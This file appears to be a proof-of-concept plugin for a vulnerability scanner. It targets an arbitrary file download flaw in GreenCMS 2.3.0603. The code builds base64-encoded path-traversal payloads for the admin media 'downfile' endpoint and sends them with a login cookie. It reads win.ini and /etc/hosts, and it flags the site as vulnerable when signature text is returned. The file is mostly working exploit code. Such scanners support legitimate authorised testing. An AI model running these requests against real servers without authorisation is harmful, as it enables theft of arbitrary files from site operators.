# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'GreenCMS_0007'  # 平台漏洞编号
    name = 'GreenCMS任意文件下载'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2018-07-24'  # 漏洞公布时间
    desc = '''
    GreenCMS 2.3.0603版本中存在任意文件下载漏洞。攻击者可借助index.php?m=admin&c=media&a=downfile URI利用该漏洞下载任意文件
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-13862'
    cnvd_id = 'CNVD-2018-13862'  # cnvd漏洞编号
    cve_id = '	CVE-2018-12988'  # cve编号
    product = 'GreenCMS'  # 漏洞组件名称
    product_version = '2.3.0603'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ea2d6bef-3272-479b-af1e-b6d6bfef6940'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-07-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                },
                'cookie': {
                    'type': 'string',
                    'description': '登录cookie',
                    'default': '',
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': self.get_option('cookie')
            }

            # 读取文件:C:\Windows\win.ini  特征:[extensions]
            win_payload = '/index.php?m=admin&c=media&a=downfile&id=QzpcV2luZG93c1x3aW4uaW5p'

            # 读取文件:../../../../../../../../../../../../../etc/hosts 特征:localhost
            linux_payload = 'index.php?m=admin&c=media&a=downfile&id=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL2hvc3Rz'

            win_url = arg + win_payload
            linux_url = arg + linux_payload
            self.output.info('正在尝试读取敏感文件信息')

            response_win = requests.get(win_url, headers=headers)
            if response_win.status_code == 200 and '[extensions]' in response_win.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

            response_linux = requests.get(linux_url, headers=headers)
            if response_linux.status_code == 200 and 'localhost' in response_linux.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
